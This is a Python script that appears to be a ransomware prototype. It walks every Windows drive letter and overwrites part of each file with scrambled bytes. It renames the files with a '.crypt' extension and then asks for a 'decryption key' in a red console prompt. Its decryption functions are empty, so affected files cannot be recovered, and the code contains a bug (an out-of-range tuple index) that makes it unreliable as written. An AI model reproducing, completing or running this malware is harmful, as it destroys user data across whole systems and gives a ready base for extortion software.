import os
import subprocess
from sys import argv
import shelve
from time import asctime
import colorama

exceptionPath = ("Windows", "Recovery")
exceptionFiles = (".sys", ".crypt")
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
diskLetters = []
encKey = "12053750276452773651950987335837612964829299200476555942647291394854673772937261948563729385747098292"    #should be of length 101 minimum and string, same for decKey
decKey = ""
INDEXID = "547448868" #10 digit ID
separator = os.sep
PWDSEP = os.curdir
CMDCOLOR = colorama.Back.RED + colorama.Fore.WHITE
ENCLEVEL = 1000
FILESCOPE = 100
mainCount = 0

def DataEncryption(Data2, Ekey):
	dataOut = []
	dataOut2 = ""
	adder = 0
	for j in Data2:
		dataOut.append(j)
	dataLength = int(round(len(dataOut) / 10))
	for c in range(0, 9):
		for i in range(0, 9):
			tempVal = dataOut[int(Ekey[i]) + adder]
			dataOut[int(Ekey[i]) + adder] = dataOut[int(Ekey[i + 1]) + adder]
			dataOut[int(Ekey[i + 1]) + adder] = tempVal
		if len(dataOut) > 40:
			adder += dataLength
	for cc in dataOut:
		dataOut2 += str(cc)
	dataOut2 = bytes(dataOut2, encoding = "utf-8")
	return dataOut2

def encryptF(Fname, key1):
	dotIndex = Fname.index(".")   #or .find
	extentionn = Fname[dotIndex:]
	cutName = Fname[0:dotIndex]
	newName = cutName + ".txt"
	os.rename(Fname, newName)
	new_file = open(newName, mode = "rb+")
	fileContentRaw = new_file.read(ENCLEVEL)
	new_file.write(b"0\\")
	fileContentEnc = DataEncryption(fileContentRaw, key1)
	new_file.write(fileContentEnc)
	new_file.close()
	Cname = Fname + exceptionFiles[2]
	os.rename(newName, Cname)

def DataDecryption(Data2, Dkey):
	pass

def decryptF(Fname2, key2):
	pass

def keyFormatt(keyU):    #the key inputted should be string type
	keyF = str(int(keyU, 16))
	return keyF

for Dletter in ALPHABET:
	DDletter = Dletter + ":"
	if os.path.exists(DDletter) == True:
		diskLetters.append(DDletter)

for EncLetter in diskLetters:
	try:
		os.chdir(EncLetter + separator)
	except:
		continue
	# traverse root directory, and list directories as dirs and files as files
	for root, dirs, files in os.walk(PWDSEP, topdown=False):
		dirStore = os.getcwd()
		sroot = root[1:].split(separator)
		froot = EncLetter
		for bname in sroot:
			froot = froot + bname + separator * 2
		try:
			os.chdir(froot)
		except:
			continue
		dirLists = os.listdir()
		for curDirCheck in dirLists:
			if os.path.isdir(curDirCheck) == False and curDirCheck[-6:] != exceptionFiles[2] and curDirCheck != None and os.path.basename(curDirCheck) != os.path.basename(str(argv[0])):
				try:
					encryptF(curDirCheck, encKey)
				except:
					continue
			elif curDirCheck[-6:] == exceptionFiles[2]:
				mainCount += 1
			if mainCount > FILESCOPE:
				break
		os.chdir(dirStore)
		if mainCount > FILESCOPE:
			break
	if mainCount > FILESCOPE:
		break
#encryption process ends here

termDate = asctime()
termDate = termDate.split()

decKey = input(f"{CMDCOLOR} \n\nEnter a decryption key:   ")
if decKey != encKey:
	while decKey != encKey:
		print(f"{CMDCOLOR} invalid input, try again")
		decKey = input("\n\nEnter a decryption key:   ")